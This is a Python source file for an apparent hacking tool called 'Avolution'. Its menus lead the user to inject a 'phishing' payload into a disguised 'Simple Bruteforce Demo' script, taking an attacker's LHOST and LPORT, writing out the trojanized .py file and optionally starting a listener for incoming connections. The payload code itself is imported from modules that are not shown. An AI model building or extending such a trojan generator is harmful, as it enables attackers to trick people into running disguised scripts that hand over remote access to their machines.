###
# Author : Muhammad Quwais Saputra
###

from system.clear import *

from src.dialogues.dialog import *
from arm.banner import *
from exploit.xploit import *

from payload.facebook.phising.inject.injects import *

import time

class Hacking:
    def facebook():
        while True:
            Clear()
            Banner()
            print("""
Choice Your Methods
  1. Phising
  2. back
            """)
            x = input("Avolution (Hacking/Facebook) > ")
            if x == "1":
                Hacking.Phising()
            elif x == "2":
                return 1
            else:
                print("[!] Wrong input!!")
                time.sleep(2)
    def Phising():
        while True:
            Clear()
            Banner()
            print("""
Use Phising Strategies
  1. inject phishing code into the hacking script
  2. back
            """)
            x = input("Avolution (Hacking/Facebook/Phising) > ")
            if x == "1":
                Hacking.Choice_script_to_be_injected()
            elif x == "2":
                Hacking.facebook()
            else:
                print("[!] Wrong input")
                time.sleep(2)
    def Choice_script_to_be_injected():
        while True:
            Clear()
            Banner()
            print("""
Choice Hacking script to be injected
  1. Simple Bruteforce Demo (DEMO)
  2. back
            """)
            x = input("Avolution (Hacking/Facebook/Phising/Inject) > ")
            if x == "1":
                LHOST = input("[?] LHOST : ")
                LPORT = input("[?] LPORT : ")
                print("\n[!] Must added with .py format")
                f_name = input("[?] File name : ")
                if ".py" not in f_name:
                    f_name += ".py"
                else:
                    pass
                Injects("sbd", f_name, LHOST, LPORT)
                print("[+] Payload Has Been Created -> {0}".format(f_name))
                while True:
                    xf = input("\n\n[?] Start The listener right now? [y/n]  ")
                    if xf == 'Y' or xf == 'y':
                        x_lhost = input("[?] Listener HOST : ")
                        x_lport = input("[?] Listener PORT : ")
                        Exploit.Listener(x_lhost, x_lport)
                    elif xf == 'n' or xf == 'N':
                        Hacking.Choice_script_to_be_injected()
                    else:
                        print("[!] Invalid input")
            elif x == "2":
                Hacking.Phising()
            else:
                print("[!] Wrong input")
                time.sleep(2)
